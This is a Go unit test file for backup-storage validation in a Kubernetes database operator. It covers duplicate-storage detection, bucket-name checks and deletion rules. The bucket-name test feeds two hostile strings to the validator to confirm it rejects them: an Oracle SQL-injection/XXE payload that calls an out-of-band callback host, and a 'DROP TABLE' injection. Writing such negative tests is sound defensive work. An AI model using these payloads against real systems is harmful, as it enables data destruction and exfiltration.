package validation

import (
	"context"
	"errors"
	"testing"

	"github.com/AlekSi/pointer"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
	k8sError "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	ctrlclient "sigs.k8s.io/controller-runtime/pkg/client"
	fakeclient "sigs.k8s.io/controller-runtime/pkg/client/fake"

	everestv1alpha1 "github.com/percona/everest-operator/api/everest/v1alpha1"
	everestapi "github.com/percona/everest/api"
	"github.com/percona/everest/internal/server/handlers/k8s"
	"github.com/percona/everest/pkg/kubernetes"
)

const (
	bsNamespace = "test-ns"
)

func TestValidateDuplicateStorageByUpdate(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name               string
		storages           *everestv1alpha1.BackupStorageList
		currentStorage     *everestv1alpha1.BackupStorage
		currentStorageName string
		params             everestapi.UpdateBackupStorageParams
		isDuplicate        bool
	}{
		{
			name: "another storage with the same 3 params",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region1",
							EndpointURL: "url1",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name: "change of url will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region2",
							EndpointURL: "url1",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1")},
			isDuplicate:        true,
		},
		{
			name: "change of bucket will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region2",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name: "change of region will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region1",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Region: pointer.ToString("region1")},
			isDuplicate:        true,
		},
		{
			name: "change of region and bucket will lead to duplication",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket1",
							Region:      "region1",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Region: pointer.ToString("region1"), BucketName: pointer.ToString("bucket1")},
			isDuplicate:        true,
		},
		{
			name: "no other storages: no duplictation",
			currentStorage: &everestv1alpha1.BackupStorage{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "storageA",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.BackupStorageSpec{
					Bucket:      "bucket2",
					Region:      "region2",
					EndpointURL: "url2",
				},
			},
			storages: &everestv1alpha1.BackupStorageList{
				Items: []everestv1alpha1.BackupStorage{
					{
						ObjectMeta: metav1.ObjectMeta{
							Name:      "storageB",
							Namespace: "ns",
						},
						Spec: everestv1alpha1.BackupStorageSpec{
							Bucket:      "bucket2",
							Region:      "region2",
							EndpointURL: "url2",
						},
					},
				},
			},
			currentStorageName: "storageA",
			params:             everestapi.UpdateBackupStorageParams{Url: pointer.ToString("url1"), BucketName: pointer.ToString("bucket1"), Region: pointer.ToString("region1")},
			isDuplicate:        false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.isDuplicate, validateDuplicateStorageByUpdate(tc.currentStorageName, tc.currentStorage, tc.storages, &tc.params))
		})
	}
}

func TestValidateBucketName(t *testing.T) {
	t.Parallel()

	type tcase struct {
		name  string
		input string
		err   error
	}

	tcases := []tcase{
		{
			name:  "empty string",
			input: "",
			err:   errInvalidBucketName,
		},
		{
			name:  "too long",
			input: `(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % uicfw SYSTEM \"http:\/\/t93xxgfug88povc63wzbdbsd349zxulx9pwfk4.oasti'||'fy.com\/\">%uicfw;]>'),'\/l') from dual)`,
			err:   errInvalidBucketName,
		},
		{
			name:  "unexpected symbol",
			input: `; DROP TABLE users`,
			err:   errInvalidBucketName,
		},
		{
			name:  "correct",
			input: "aaa-12-d.e",
			err:   nil,
		},
	}

	for _, tc := range tcases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateBucketName(tc.input)
			assert.ErrorIs(t, err, tc.err)
		})
	}
}

func TestValidate_DeleteBackupStorage(t *testing.T) {
	t.Parallel()

	type testCase struct {
		name            string
		objs            []ctrlclient.Object
		objNameToDelete string
		wantErr         error
	}
	testCases := []testCase{
		// no backup storages
		{
			name:            "no backup storages",
			objNameToDelete: "test-backup-storage",
			wantErr: k8sError.NewNotFound(schema.GroupResource{
				Group:    everestv1alpha1.GroupVersion.Group,
				Resource: "backupstorages",
			},
				"test-backup-storage",
			),
		},
		// delete non-existing backup storage
		{
			name: "delete non-existing backup storage",
			objs: []ctrlclient.Object{
				&everestv1alpha1.BackupStorage{
					ObjectMeta: metav1.ObjectMeta{
						Namespace: bsNamespace,
						Name:      "test-backup-storage",
					},
					Spec: everestv1alpha1.BackupStorageSpec{},
				},
			},
			objNameToDelete: "non-existing-backup-storage",
			wantErr: k8sError.NewNotFound(schema.GroupResource{
				Group:    everestv1alpha1.GroupVersion.Group,
				Resource: "backupstorages",
			},
				"non-existing-backup-storage",
			),
		},
		// delete non-used backup storage
		{
			name: "delete non-used backup storage",
			objs: []ctrlclient.Object{
				&everestv1alpha1.BackupStorage{
					ObjectMeta: metav1.ObjectMeta{
						Namespace: bsNamespace,
						Name:      "test-backup-storage",
					},
					Spec: everestv1alpha1.BackupStorageSpec{},
				},
			},
			objNameToDelete: "test-backup-storage",
		},
		// delete used backup storage
		{
			name: "delete used backup storage",
			objs: []ctrlclient.Object{
				&everestv1alpha1.BackupStorage{
					ObjectMeta: metav1.ObjectMeta{
						Namespace:  bsNamespace,
						Name:       "test-backup-storage",
						Finalizers: []string{everestv1alpha1.InUseResourceFinalizer},
					},
					Spec: everestv1alpha1.BackupStorageSpec{},
				},
			},
			objNameToDelete: "test-backup-storage",
			wantErr:         errors.Join(ErrInvalidRequest, errDeleteInUseBackupStorage(bsNamespace, "test-backup-storage")),
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			mockClient := fakeclient.NewClientBuilder().
				WithScheme(kubernetes.CreateScheme()).
				WithObjects(tc.objs...).
				Build()
			k := kubernetes.NewEmpty(zap.NewNop().Sugar()).WithKubernetesClient(mockClient)
			k8sHandler := k8s.New(zap.NewNop().Sugar(), k, "")

			valHandler := New(zap.NewNop().Sugar(), k)
			valHandler.SetNext(k8sHandler)

			err := valHandler.DeleteBackupStorage(context.Background(), bsNamespace, tc.objNameToDelete)
			if tc.wantErr != nil {
				assert.Equal(t, tc.wantErr.Error(), err.Error())
				return
			}
			require.NoError(t, err)
		})
	}
}
